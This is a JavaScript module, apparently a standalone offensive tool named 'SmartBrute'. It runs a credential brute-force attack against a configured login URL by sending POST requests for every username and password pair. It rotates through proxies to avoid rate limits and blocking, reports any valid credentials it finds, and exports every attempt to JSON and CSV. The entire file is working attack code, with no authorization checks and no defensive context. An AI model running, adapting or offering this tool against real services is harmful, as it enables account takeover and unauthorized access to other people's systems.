const axios = require('axios');
const chalk = require('chalk');

class SmartBrute {
    constructor(config, proxies = []) {
        this.config = config;
        this.proxies = proxies;
        this.results = [];
        this.currentProxyIndex = 0;
    }

    getProxy() {
        if (!this.config.useProxy || this.proxies.length === 0) {
            return null;
        }
        const proxy = this.proxies[this.currentProxyIndex];
        this.currentProxyIndex = (this.currentProxyIndex + 1) % this.proxies.length;
        return {
            host: proxy.host,
            port: proxy.port,
            protocol: proxy.protocol,
        };
    }

    async attemptLogin(username, password) {
        const config = {
            method: 'POST',
            url: this.config.targetUrl,
            data: { username, password },
            timeout: 5000,
            validateStatus: () => true,
        };

        const proxy = this.getProxy();
        if (proxy) {
            config.proxy = proxy;
        }

        try {
            const response = await axios(config);
            return {
                success: response.status === 200,
                status: response.status,
                data: response.data,
            };
        } catch (error) {
            return {
                success: false,
                error: error.message,
            };
        }
    }

    async run() {
        console.log(chalk.bold.cyan('\n🔓 Smart Brute Force Started\n'));
        console.log(chalk.gray('='.repeat(60)));
        console.log(chalk.white(`Target: ${this.config.targetUrl}`));
        console.log(chalk.white(`Usernames: ${this.config.usernames.length}`));
        console.log(chalk.white(`Passwords: ${this.config.passwords.length}`));
        console.log(chalk.white(`Max Attempts: ${this.config.maxAttempts || 'Unlimited'}`));
        console.log(chalk.gray('='.repeat(60)));

        const startTime = Date.now();
        let attempts = 0;
        const maxAttempts = this.config.maxAttempts || Infinity;
        const allResults = [];

        for (const username of this.config.usernames) {
            for (const password of this.config.passwords) {
                if (attempts >= maxAttempts) {
                    console.log(chalk.yellow('\n⚠️  Max attempts reached'));
                    break;
                }

                attempts++;
                process.stdout.write(`\r${chalk.cyan(`[${attempts}] Testing ${username}:${password}...`.padEnd(60))}`);

                const result = await this.attemptLogin(username, password);

                const resultEntry = {
                    timestamp: new Date().toISOString(),
                    username,
                    password,
                    success: result.success,
                    status: result.status,
                    error: result.error || null,
                };

                allResults.push(resultEntry);

                if (result.success) {
                    console.log(chalk.green(`\n✓ SUCCESS: ${username}:${password} (Status: ${result.status})`));
                } else if (result.error) {
                    console.log(chalk.red(`\n✗ ERROR: ${username}:${password} - ${result.error}`));
                }

                if (this.config.delay) {
                    await new Promise(resolve => setTimeout(resolve, this.config.delay));
                }
            }

            if (attempts >= maxAttempts) break;
        }

        const elapsed = ((Date.now() - startTime) / 1000).toFixed(2);
        const successful = allResults.filter(r => r.success).length;

        console.log(chalk.bold.cyan('\n\n📊 Brute Force Summary\n'));
        console.log(chalk.gray('='.repeat(60)));
        console.log(chalk.white(`Total Attempts: ${attempts}`));
        console.log(chalk.green(`Successful: ${successful}`));
        console.log(chalk.red(`Failed: ${attempts - successful}`));
        console.log(chalk.gray(`Time elapsed: ${elapsed}s`));
        console.log(chalk.gray('='.repeat(60)));

        if (successful > 0) {
            console.log(chalk.green('\n✓ Valid Credentials Found:'));
            allResults.filter(r => r.success).forEach(r => {
                console.log(chalk.white(`  • ${r.username}:${r.password}`));
            });
        }

        const finalResults = {
            timestamp: new Date().toISOString(),
            targetUrl: this.config.targetUrl,
            totalAttempts: attempts,
            successful,
            failed: attempts - successful,
            timeElapsed: elapsed,
            attempts: allResults,
        };

        this.results.push(finalResults);

        console.log(chalk.bold.green('\n✅ Smart Brute Force Complete!\n'));

        return finalResults;
    }

    exportJSON(filename) {
        const fs = require('fs');
        fs.writeFileSync(filename, JSON.stringify(this.results, null, 2));
        console.log(chalk.green(`\n✅ Results exported to ${filename}`));
    }

    exportCSV(filename) {
        const fs = require('fs');
        const csvRows = ['Timestamp,Username,Password,Success,Status,Error'];

        this.results.forEach(result => {
            result.attempts.forEach(attempt => {
                csvRows.push(
                    `${attempt.timestamp},"${attempt.username}","${attempt.password}",${attempt.success},${attempt.status || ''},"${attempt.error || ''}"`
                );
            });
        });

        fs.writeFileSync(filename, csvRows.join('\n'));
        console.log(chalk.green(`\n✅ Results exported to ${filename}`));
    }
}

module.exports = SmartBrute;